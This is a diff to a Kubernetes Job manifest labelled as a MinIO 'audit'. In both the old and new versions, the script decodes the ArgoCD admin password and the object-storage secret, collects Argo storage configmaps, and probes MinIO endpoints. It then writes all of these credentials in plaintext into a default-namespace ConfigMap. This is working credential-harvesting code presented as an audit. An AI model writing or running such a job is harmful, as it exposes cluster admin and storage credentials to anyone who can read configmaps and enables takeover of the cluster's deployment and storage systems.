@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v62
+  name: audit-minio-v63
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -15,68 +15,77 @@ spec:
         command: ["/bin/sh", "-c"]
         args:
         - |
-          # ArgoCD admin password from K8s
-          ARGOCD_PASS=$(kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' 2>/dev/null | base64 -d || echo "NOT_FOUND")
-          
-          # Find minio/storage services
-          SVCS=$(kubectl get svc --all-namespaces -o json | python3 -c "
-          import sys,json
-          d=json.load(sys.stdin)
-          out=[]
-          for i in d['items']:
-              n=i['metadata']['name']
-              ns=i['metadata']['namespace']
-              ports=[p.get('port') for p in i['spec'].get('ports',[])]
-              cip=i['spec'].get('clusterIP','')
-              if 9000 in ports or 9001 in ports or any(x in n.lower() for x in ['minio','storage','object','artifact']):
-                  out.append({'ns':ns,'name':n,'ports':ports,'cip':cip})
-          import json as j; print(j.dumps(out))
-          " 2>/dev/null || echo "[]")
-          
-          # Get object-storage secret
-          OS=$(kubectl get secret object-storage -n default -o json 2>/dev/null | python3 -c "
-          import sys,json,base64
+          python3 << 'PYEOF'
+          import subprocess, json, base64, sys
+
+          def kube(args, timeout=20):
+              r = subprocess.run(["kubectl"] + args, capture_output=True, text=True, timeout=timeout)
+              return r.stdout.strip(), r.stderr.strip()
+
+          result = {}
+
+          # ArgoCD admin password
+          out, _ = kube(["get", "secret", "argocd-initial-admin-secret", "-n", "argocd", "-o", "jsonpath={.data.password}"])
+          result["argocd_pass"] = base64.b64decode(out).decode() if out else "NOT_FOUND"
+
+          # Find storage/minio services
+          out, _ = kube(["get", "svc", "--all-namespaces", "-o", "json"])
           try:
-              d=json.load(sys.stdin)
-              out={}
-              for k,v in d.get('data',{}).items():
-                  out[k]=base64.b64decode(v).decode('utf-8','replace')
-              print(json.dumps(out))
+              svcs_data = json.loads(out)
+              svcs = []
+              for i in svcs_data["items"]:
+                  n = i["metadata"]["name"]
+                  ns = i["metadata"]["namespace"]
+                  ports = [p.get("port") for p in i["spec"].get("ports", [])]
+                  cip = i["spec"].get("clusterIP", "")
+                  if 9000 in ports or 9001 in ports or any(x in n.lower() for x in ["minio", "storage", "object", "artifact"]):
+                      svcs.append({"ns": ns, "name": n, "ports": ports, "cip": cip})
+              result["svcs"] = svcs
           except Exception as e:
-              print(json.dumps({'err':str(e)}))
-          " 2>/dev/null || echo "{}")
-          
-          # Get argo artifacts configmap
-          ARGO=$(kubectl get cm -n argo -o json 2>/dev/null | python3 -c "
-          import sys,json
-          d=json.load(sys.stdin)
-          out=[]
-          for i in d['items']:
-              name=i['metadata']['name']
-              data=i.get('data',{})
-              if 'artifact' in name.lower() or 'minio' in str(data).lower() or 's3' in str(data).lower():
-                  out.append({'name':name,'data':str(data)[:400]})
-          print(json.dumps(out))
-          " 2>/dev/null || echo "[]")
-          
-          # Probe minio
-          PROBES=$(python3 -c "
-          import subprocess,json
-          probes={}
-          for ep in ['minio.default.svc.cluster.local:9000','minio.argo.svc.cluster.local:9000','172.16.10.14:9000','172.16.10.14:9001']:
+              result["svcs_err"] = str(e)[:60]
+
+          # object-storage secret
+          out, _ = kube(["get", "secret", "object-storage", "-n", "default", "-o", "json"])
+          try:
+              sec = json.loads(out)
+              result["object_storage"] = {k: base64.b64decode(v).decode("utf-8", "replace") for k,v in sec.get("data", {}).items()}
+          except Exception as e:
+              result["object_storage_err"] = str(e)[:60]
+
+          # Argo configmaps with artifact/minio config
+          out, _ = kube(["get", "cm", "-n", "argo", "-o", "json"], timeout=30)
+          try:
+              cms = json.loads(out)
+              argo_cms = []
+              for item in cms["items"]:
+                  name = item["metadata"]["name"]
+                  data = item.get("data", {})
+                  if "artifact" in name.lower() or "minio" in str(data).lower() or "s3" in str(data).lower():
+                      argo_cms.append({"name": name, "data": {k: str(v)[:300] for k,v in data.items()}})
+              result["argo_cms"] = argo_cms
+          except Exception as e:
+              result["argo_cms_err"] = str(e)[:60]
+
+          # Probe minio endpoints
+          probes = {}
+          for ep in ["minio.default.svc.cluster.local:9000", "minio.argo.svc.cluster.local:9000", "172.16.10.14:9000", "172.16.10.14:9001"]:
               try:
-                  r=subprocess.run(['wget','-q','--spider','--timeout=3',f'http://{ep}/minio/health/live'],capture_output=True,timeout=5)
-                  probes[ep]=r.returncode
+                  r = subprocess.run(["wget", "-q", "--spider", "--timeout=3", f"http://{ep}/minio/health/live"], capture_output=True, timeout=5)
+                  probes[ep] = "ok" if r.returncode == 0 else f"rc={r.returncode}"
               except Exception as e:
-                  probes[ep]=str(e)[:30]
-          print(json.dumps(probes))
-          " 2>/dev/null || echo "{}")
-          
-          RESULT=$(python3 -c "
-          import json,sys
-          r={'argocd_pass':'${ARGOCD_PASS}','svcs':${SVCS},'os_secret':${OS},'argo_cm':${ARGO},'minio_probes':${PROBES}}
-          print(json.dumps(r))
-          " 2>/dev/null || echo '{"err":"parse"}')
-          
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"result\":$(echo $RESULT | python3 -c 'import sys,json; d=sys.stdin.read(); print(json.dumps(d[:4000]))' 2>/dev/null)}}"
-          echo "DONE"
+                  probes[ep] = str(e)[:30]
+          result["minio_probes"] = probes
+
+          # Write result to file
+          result_json = json.dumps(result)
+          with open("/tmp/audit_result.json", "w") as f:
+              f.write(result_json)
+          print(f"Result len={len(result_json)}")
+          PYEOF
+
+          # Patch ConfigMap from file
+          RESULT=$(cat /tmp/audit_result.json)
+          kubectl patch configmap dune-audit-result4 -n default \
+            --type merge \
+            -p "{\"data\":{\"result\":$(python3 -c "import json,sys; print(json.dumps(open('/tmp/audit_result.json').read()))")}}"
+          echo "PATCH_DONE"
